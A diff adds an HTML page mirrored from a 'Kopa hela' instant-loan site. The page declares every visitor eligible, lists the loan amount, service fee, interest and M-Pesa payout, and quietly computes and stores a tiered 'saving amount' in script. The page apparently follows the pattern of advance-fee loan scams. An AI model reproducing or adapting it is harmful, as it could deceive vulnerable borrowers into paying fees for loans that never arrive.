@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from Kopa-hela.vercel.app/upplication-details.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 21 May 2025 13:03:45 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loan Eligibility</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 100%;
+            padding: 20px;
+            /*background: linear-gradient(135deg, #555ab1, #070930);
+            margin: 20px auto;
+            background: radial-gradient(135deg, #555ab1, #070930);*/
+            background-color: #209bde;
+            ;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        .logo-circle {
+            width: 30px;
+            height: 30px;
+            background-color: #cdf4d0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .bolt {
+            color: #00c853;
+            font-size: 1.2em;
+        }
+
+        .dark-mode {
+            background: #cdf4d0;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        h1 {
+            font-size: 1.2em;
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        h2 {
+            font-size: 0.8em;
+            text-align: left;
+            margin: 30px 0;
+            margin-left: 0%;
+        }
+
+        h3 {
+            font-size: 0.9em;
+            margin: 30px 0;
+            margin-left: 5%;
+        }
+
+        h4 {
+            font-size: 1.1em;
+            margin: 30px 0;
+            margin-left: 5%;
+            margin-top: -9%;
+        }
+
+        h5 {
+            font-size: 0.9em;
+            margin: 30px 0;
+            margin-left: 5%;
+        }
+
+        h6 {
+            font-size: 1.1em;
+            margin: 30px 0;
+            margin-left: 5%;
+        }
+
+        .loan-message {
+            background: linear-gradient(135deg, #26859d, #070930);
+            padding: 20px;
+            border-radius: 52px;
+            /*margin: 20px 0;
+            position: fixed;*/
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            height: 65%;
+            margin-top: -20.5%;
+            margin-left: -10%;
+            width: 110%;
+            
+        }
+
+        .verify-button {
+            background: linear-gradient(135deg, #00ff59, #206f83);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 52px;
+            border: none;
+            width: 80%;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin: 10px 0;
+            margin-left: 10%;
+            font-weight: bold;
+        }
+
+        .verify-buttons {
+            background: #05a247;
+            color: white;
+            /*padding: 12px 20px;*/
+            border-radius: 25px;
+            border: none;
+            width: 100%;
+            align-self: center;
+            align-items: center;
+            align-content: center;
+            font-size: 1em;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+
+        .loan-table {
+            background: #ddeefa;
+            border-radius: 12px;
+            border-color: #000000;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-top: -13%;
+            width: 100%;
+            margin-left: 2%;
+        }
+
+        .loan-tabless {
+            background: #ddeefa;
+            border-radius: 12px;
+            border-color: #000000;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-top: +5%;
+            width: 100%;
+            margin-left: 2%;
+        }
+
+        .loan-table div {
+            display: flex;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .loan-table div:last-child {
+            border-bottom: none;
+        }
+
+        .loan-table .label {
+            flex: 1;
+            padding: 15px;
+            background: #ddeefa;
+            color: #000000;    
+            width: 100%;        
+        }
+
+        .loan-table .labels {
+            flex: 1;
+            padding: 15px;
+            background: #ddeefa51;
+            color: #000000;
+            width: 100%;
+        }
+
+        .loan-table .value {
+            flex: 1;
+            padding: 15px;
+            color: #333;
+        }
+
+        .loan-tables div {
+            display: flex;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .loan-tables div:last-child {
+            border-bottom: none;
+        }
+
+        .loan-tabless .label {
+            flex: 1;
+            padding: 15px;
+            background: #ddeefa;
+            color: #000000;            
+        }
+
+        .loan-tabless .labels {
+            flex: 1;
+            padding: 15px;
+            background: #ddeefa51;
+            color: #000000;
+            width: 100%;
+        }
+
+        .loan-tabless .value {
+            flex: 1;
+            padding: 15px;
+            color: #333;
+        }
+
+        .status-pending {
+            background: #ad6721;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 15px;
+            display: inline-block;
+        }
+
+        .status-not-verified {
+            background: #e6061d;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 15px;
+            display: inline-block;
+        }
+
+        .footer {
+            text-align: center;
+            color: #666;
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: wheat;
+        }
+
+                                    /* PWA Install Popup Styles */
+                                    #pwa-install-popup {
+                      display: none;
+                      position: fixed;
+                      top: 45%;
+                      left: -7%;
+                      width: 100%;
+                      height: 100%;
+                      background: transparent;
+                      z-index: 1000;
+                      justify-content: center;
+                      align-items: center;
+                  }
+          
+                  .pwa-popup-content {
+                      background: transparent;
+                      width: 90%;
+                      max-width: 400px;
+                      border-radius: 20px;
+                      padding: 2rem;
+                      text-align: center;
+                      box-shadow: 0 4px 20px transparent;
+                  }
+          
+                  .pwa-popup-content img {
+                      width: 150px;
+                      height: 150px;
+                      margin: 1rem auto;
+                      display: block;
+                  }
+          
+                  .pwa-popup-buttons {
+                      display: flex;
+                      justify-content: space-between;
+                      margin-top: 1rem;
+                  }
+          
+                  .pwa-popup-buttons button {
+                      flex: 1;
+                      margin: 0 0.5rem;
+                      padding: 1rem;
+                      border: none;
+                      border-radius: 8px;
+                      cursor: pointer;
+                      font-weight: bold;
+                  }
+          
+                  .pwa-install-btn {
+                      background: linear-gradient(135deg, #6b73ff, #000dff);
+                      color: white;
+                  }
+          
+                  .pwa-cancel-btn {
+                      background: #f1f1f1;
+                      color: #333;
+                  }
+          
+                  .gif-container img {
+                      max-width: 20%;
+                      height: auto;
+                      border-radius: 8px;
+                  }
+    </style>
+</head>
+<body>
+                    <!-- PWA Install Popup -->
+                    <div id="pwa-install-popup">
+                        <div class="pwa-popup-content">
+                            <div class="gif-container">
+                                <img src="assets/process.gif" alt="Authorization GIF" id="gifcontent">
+                            </div>
+                        </div>
+                    </div>
+    
+    <!--div class="header">
+        <div class="logo">
+            Kopa hela
+            <div class="logo-circle">
+                <span class="bolt">⚡</span>
+            </div>
+        </div>
+        <div class="dark-mode">🌙</div>
+    </div-->
+
+    
+
+    <div class="loan-message">
+        <h1 style="color: white;">Eligibility Successful. You Qualify for a Loan.</h1>
+        <h2 style="color: rgb(237, 230, 230);">Early settlement may result in reduction of interest                                                                             .</h2>
+        <h3 style="color: rgb(175, 170, 170);">Loan Amount Qualified</h3>
+        <h4 style="color: white;" id="limit">Ksh 6,500</h4>
+        <h5 style="color: rgb(151, 147, 147);">Term <span style="margin-left: 50%;"> Receive Amount</span></h5>
+        <h4 style="color: white;">14 days <span style="margin-left: 45%;" id="received"> Ksh 5,3440</span></h6>
+       <!--p style="color: white;"> Hi, you qualify for a Loan of <span style="font-weight: bolder;" >Ksh. 4500</span> to your M-PESA. Your loan repayment period is 2 months with 8% interest rate. Terms and conditions apply</p-->
+        <!--button class="verify-buttons">Complete verification to receive your loan</button-->
+    </div>
+
+    <div class="loan-table">
+        <div>
+            <div class="labels" >Awarded Loan Amount :</div>
+            <div class="labels" id="limit1" style="margin-left: 0%;"><strong>Ksh 6,500</strong></div>
+        </div>
+        <div>
+            <div class="labels" >Service Fee :</div>
+            <div class="labels" id="Servicefee" style="margin-left: 0%;"><strong>Ksh 636</strong></div>
+        </div>
+        <div>
+            <div class="labels" >Interest Rate :</div>
+            <div class="labels" id="user-nam" style="margin-left: 0%;"><strong>8%</strong></div>
+        </div>
+        <div>
+            <div class="labels" >Interest Applied(8%) :</div>
+            <div class="labels" id="interestrate" style="margin-left: 0%;"> <strong>Ksh 520</strong></div>
+        </div>
+        <div>
+            <div class="labels" >Disburseable Amount to Mpesa :</div>
+            <div class="labels" id="received1" style="margin-left: 0%;"> <strong>Ksh 5,344</strong></div>
+        </div>
+    </div>
+
+    <div class="loan-tabless">
+        <div>
+            <div class="labels" ><span style="margin-left: 30%;"><strong>Mpesa Account</strong></span></div>
+            <!--div class="labels" id="user-name">Wei bwana</div-->
+        </div>
+        <div>
+            <!--div class="labels"> Mpesa Number : <span style="margin-left: 5%;"> <strong></strong></span></div-->
+            <div class="labels" id="phonenumber"></div>
+        </div>
+        <div>
+            <!--div class="labels">Account name :<span style="margin-left: 5%;"> <strong></strong></span></div-->
+            <div class="labels" id="youname"></div>
+        </div>
+
+        <button class="verify-button" onclick="goToSecondPage()">Apply Now</button>
+    </div>
+
+    <script>
+
+        let limit = document.getElementById('limit');
+        let limit1 = document.getElementById('limit1');
+        let Servicefee = document.getElementById('Servicefee');
+        let interestrate = document.getElementById('interestrate');
+        let received = document.getElementById('received');
+        let received1 = document.getElementById('received1');
+        
+        let lims = 0.00
+        lims = parseFloat(localStorage.getItem('limit'));       
+        limit.textContent = "Ksh " + (lims.toFixed(2)); 
+        limit1.textContent = "Ksh " + (lims.toFixed(2));
+
+        //limit.innerHTML = '<b>' + limit.innerHTML + '</b>'; 
+        limit1.innerHTML = '<b>' + limit1.innerHTML + '</b>';
+
+        let fee = 0.00;
+        let savingamount = 0.00;
+        
+        if (lims >= 20000) {
+            fee = 522.00;
+            savingamount = 950.00;
+            //lims = lims - fee;
+        } else if (lims >= 10000) {
+            fee = 322.00;
+            savingamount = 450.00;
+            //lims = lims - fee;
+        } else if (lims >= 7000) {
+            fee = 292.00;
+            savingamount = 300.00;
+            //lims = lims - fee;
+        } else if (lims >= 6000) {
+            fee = 248.00;
+            savingamount = 220.00;
+            //lims = lims - fee;
+        } else if (lims >= 4000) {
+            fee = 198.00;
+            savingamount = 170.00;
+            //lims = lims - fee;
+        } else if (lims <= 3500) {
+            fee = 156.00;
+            savingamount = 120.00;
+            //lims = lims - fee;
+        }
+
+        localStorage.setItem('saveamount',savingamount);
+
+        //limit.textContent = "Ksh " + lims;
+        let interestR = (lims * 0.08);
+        interestrate.textContent = "Ksh" + (interestR.toFixed(2));
+        Servicefee.textContent = "Ksh " + (fee.toFixed(2));
+        let receiveable = lims - ((interestR + fee).toFixed(2));
+        received.textContent = "Ksh " + (receiveable.toFixed(2));
+        received1.textContent = "Ksh " + (receiveable.toFixed(2));
+
+        received1.innerHTML = '<b>' + received1.innerHTML + '</b>';
+        Servicefee.innerHTML = '<b>' + Servicefee.innerHTML + '</b>';
+        interestrate.innerHTML = '<b>' + interestrate.innerHTML + '</b>';
+
+
+    </script>
+
+    <div class="footer">
+        © Kopa hela 2025
+    </div>
+    <script src="loan-details.js"></script>
+    <script src="index.js"></script>
+</body>
+
+<!-- Mirrored from Kopa-hela.vercel.app/upplication-details.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 21 May 2025 13:03:46 GMT -->
+</html>
